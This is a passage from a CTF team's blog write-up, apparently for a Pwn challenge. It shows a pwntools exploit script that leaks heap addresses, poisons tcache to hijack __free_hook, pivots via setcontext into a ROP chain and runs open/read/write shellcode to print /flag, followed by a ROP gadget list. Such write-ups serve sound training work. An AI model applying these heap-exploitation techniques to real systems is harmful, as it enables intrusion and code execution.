class="line">ru(<span class="string">&#x27;u&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_leak = uu64(rc(<span class="number">6</span>))</span><br><span class="line">heap_base = heap_leak - <span class="number">0x420</span></span><br><span class="line">lg(<span class="string">&#x27;heap_leak&#x27;</span>,heap_leak)</span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Hijack __free_hook -&gt; gets,Overflow,Setcontext ROP -&gt; ORW</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">0x80</span>+p64((heap_base&gt;&gt;<span class="number">12</span>)^(libc.sym.__free_hook)))</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">0x80</span>+p64((heap_base&gt;&gt;<span class="number">12</span>)^(libc.sym.__free_hook)))</span><br><span class="line">add(<span class="number">4</span>,p64(libc.sym.gets))</span><br><span class="line"></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005525c</span></span><br><span class="line"></span><br><span class="line">magic = libc_base + <span class="number">0x14a0a0</span> </span><br><span class="line"></span><br><span class="line">fuck = SigreturnFrame()</span><br><span class="line">fuck.rip = libc.sym.read</span><br><span class="line">fuck.rdx = <span class="number">0x300</span></span><br><span class="line">fuck.rdi = <span class="number">0</span></span><br><span class="line">fuck.rsi = heap_base + <span class="number">0x300</span></span><br><span class="line">fuck.rsp = heap_base + <span class="number">0x300</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>]+[<span class="number">0</span>,heap_base+<span class="number">0x430</span>,-<span class="number">1</span>,-<span class="number">1</span>,libc.sym.setcontext+<span class="number">61</span>,<span class="built_in">str</span>(fuck)[<span class="number">0x28</span>:]]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">sl(p64(magic))</span><br><span class="line"></span><br><span class="line">rdi = libc_base + <span class="number">0x0000000000028a55</span></span><br><span class="line">rsi = libc_base + <span class="number">0x000000000002a4cf</span></span><br><span class="line">rdx = libc_base + <span class="number">0x00000000000c7f32</span></span><br><span class="line">jmp_rsi = libc_base + <span class="number">0x00000000000506b1</span></span><br><span class="line">rop_chain = flat([</span><br><span class="line">    rdi,heap_base,rsi,<span class="number">0x1000</span>,rdx,<span class="number">7</span>,libc.sym.mprotect,rdi,<span class="number">0</span>,rsi,heap_base,rdx,<span class="number">0x200</span>,libc.sym.read,jmp_rsi</span><br><span class="line">])</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">sl(rop_chain)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">sl(asm(shellcraft.pushstr(<span class="string">&#x27;/flag&#x27;</span>)+shellcraft.syscall(<span class="string">&#x27;0x101&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)+shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="string">&#x27;0x50&#x27;</span>)+shellcraft.write(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="string">&#x27;0x50&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000044c70 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x000000000002a334 : pop rax ; ret 0xffff</span></span><br><span class="line"><span class="string">0x00000000000266e0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000002682f : pop rbp ; ret 0x1b</span></span><br><span class="line"><span class="string">0x000000000003418f : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000008dd61 : pop rbx ; ret 0xffff</span></span><br><span class="line"><span class="string">0x0000000000028a55 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000c7f32 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x000000000002a4cf : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x0000000000033af2 : pop rsp ; ret</span></span><br><span class="line"><span class="string">0x0000000000026699 : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://ttl-team.github.io">TTL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://ttl-team.github.io/TTLs/59184.html">https://ttl-team.github.io/TTLs/59184.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="http://ttl.easyctf.cn/img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114131157292.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/TTLs/50334.html"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">nginx_mysql_php73</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/images/logo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">TTL</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">TTL战队：Think Teenager Listen</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyMisc"><span class="toc-number">1.2.</span> <span class="toc-text">EasyMisc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E5%8F%88%E4%B8%8D%E5%A5%87%E6%80%AA"><span class="toc-number">1.3.</span> <span class="toc-text">奇怪又不奇怪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E4%BB%80%E4%B9%88%E9%A2%98%E5%95%8A%E6%9D%A5%E6%8C%AF%E5%88%80%E5%95%8A"><span class="toc-number">1.4.</span> <span class="toc-text">做什么题啊来振刀啊</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasySo"><span class="toc-number">1.5.</span> <span class="toc-text">EasySo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ScanQR"><span class="toc-number">1.6.</span> <span class="toc-text">ScanQR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie%E6%80%8E%E4%B9%88%E5%88%86"><span class="toc-number">1.7.</span> <span class="toc-text">Cookie怎么分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%89%E4%BB%96"><span class="toc-number">1.8.</span> <span class="toc-text">吉他</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Snake"><span class="toc-number">2.1.</span> <span class="toc-text">Snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#82-83-65"><span class="toc-number">2.2.</span> <span class="toc-text">82.83.65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CryptoSOS"><span class="toc-number">2.3.</span> <span class="toc-text">CryptoSOS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-RSA"><span class="toc-number">2.4.</span> <span class="toc-text">Baby RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What"><span class="toc-number">2.5.</span> <span class="toc-text">What</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E5%8F%88%E5%A5%87%E6%80%AA"><span class="toc-number">2.6.</span> <span class="toc-text">奇怪又奇怪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BoomThis"><span class="toc-number">2.7.</span> <span class="toc-text">BoomThis</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E5%B0%8F%E8%83%BD%E6%89%8B"><span class="toc-number">3.1.</span> <span class="toc-text">签到小能手</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E9%95%87%E5%81%9A%E9%A2%98%E5%AE%B6"><span class="toc-number">3.2.</span> <span class="toc-text">小镇做题家</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E8%83%83%E8%8F%9C"><span class="toc-number">3.3.</span> <span class="toc-text">开胃菜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Queen"><span class="toc-number">3.4.</span> <span class="toc-text">Queen</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Where"><span class="toc-number">3.5.</span> <span class="toc-text">Where</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Discuz"><span class="toc-number">3.6.</span> <span class="toc-text">Discuz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%91%E6%81%AF%E6%97%B6%E9%97%B4"><span class="toc-number">3.7.</span> <span class="toc-text">休息时间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic"><span class="toc-number">3.8.</span> <span class="toc-text">Weblogic</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Check"><span class="toc-number">4.1.</span> <span class="toc-text">Check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LookThis"><span class="toc-number">4.2.</span> <span class="toc-text">LookThis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyBase"><span class="toc-number">4.3.</span> <span class="toc-text">EasyBase</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5"><span class="toc-number">4.4.</span> <span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#This-is"><span class="toc-number">4.5.</span> <span class="toc-text">This..is</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tea"><span class="toc-number">4.6.</span> <span class="toc-text">Tea</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%93%83%E8%BF%98%E9%A1%BB%E7%B3%BB%E9%93%83%E4%BA%BA"><span class="toc-number">4.7.</span> <span class="toc-text">解铃还须系铃人</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#game"><span class="toc-number">5.1.</span> <span class="toc-text">game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stackoverflow"><span class="toc-number">5.2.</span> <span class="toc-text">stackoverflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssssssn"><span class="toc-number">5.3.</span> <span class="toc-text">ssssssn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#animal"><span class="toc-number">5.4.</span> <span class="toc-text">animal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gift"><span class="toc-number">5.5.</span> <span class="toc-text">gift</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SummerIOT"><span class="toc-number">5.6.</span> <span class="toc-text">SummerIOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">5.6.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">5.6.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">5.6.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/TTLs/59184.html" title="2022弱口令实验室招新赛WriteUp"><img src="http://ttl.easyctf.cn/img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114131157292.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022弱口令实验室招新赛WriteUp"/></a><div class="content"><a class="title" href="/TTLs/59184.html" title="2022弱口令实验室招新赛WriteUp">2022弱口令实验室招新赛WriteUp</a><time datetime="2022-11-14T04:41:18.000Z" title="Created 2022-11-14 12:41:18">2022-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/TTLs/50334.html" title="nginx_mysql_php73"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="nginx_mysql_php73"/></a><div class="content"><a class="title" href="/TTLs/50334.html" title="nginx_mysql_php73">nginx_mysql_php73</a><time datetime="2022-10-20T09:10:00.000Z" title="Created 2022-10-20 17:10:00">2022-10-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/TTLs/50983.html" title="青少年CTF平台-Web-PingMe"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="青少年CTF平台-Web-PingMe"/></a><div class="content"><a class="title" href="/TTLs/50983.html" title="青少年CTF平台-Web-PingMe">青少年CTF平台-Web-PingMe</a><time datetime="2022-10-09T06:00:16.000Z" title="Created 2022-10-09 14:00:16">2022-10-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/TTLs/54241.html" title="青少年CTF-Web-CheckMe01"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="青少年CTF-Web-CheckMe01"/></a><div class="content"><a class="title" href="/TTLs/54241.html" title="青少年CTF-Web-CheckMe01">青少年CTF-Web-CheckMe01</a><time datetime="2022-10-09T05:22:24.000Z" title="Created 2022-10-09 13:22:24">2022-10-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/TTLs/2194.html" title="青少年CTF平台-Web-POST&amp;GET"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="青少年CTF平台-Web-POST&amp;GET"/></a><div class="content"><a class="title" href="/TTLs/2194.html" title="青少年CTF平台-Web-POST&amp;GET">青少年CTF平台-Web-POST&amp;GET</a><time datetime="2022-10-09T05:11:09.000Z" title="Created 2022-10-09 13:11:09">2022-10-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By TTL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>